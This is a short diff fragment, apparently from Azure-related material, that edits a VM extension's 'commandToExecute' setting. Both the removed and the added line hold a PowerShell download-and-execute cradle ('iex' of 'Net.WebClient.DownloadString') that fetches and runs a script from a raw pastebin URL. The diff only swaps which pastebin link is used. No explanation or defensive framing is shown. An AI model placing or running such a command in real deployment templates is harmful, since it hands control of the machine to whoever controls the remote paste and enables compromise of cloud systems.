@@ -279,7 +279,7 @@ az logout --username
             "typeHandlerVersion": "1.10",
             "autoUpgradeMinorVersion": true,
             "settings": {
-              "commandToExecute": "powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/xijwGbhH')\""
+              "commandToExecute": "powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/ZTxAYqyU')\""
             }
           }
         }
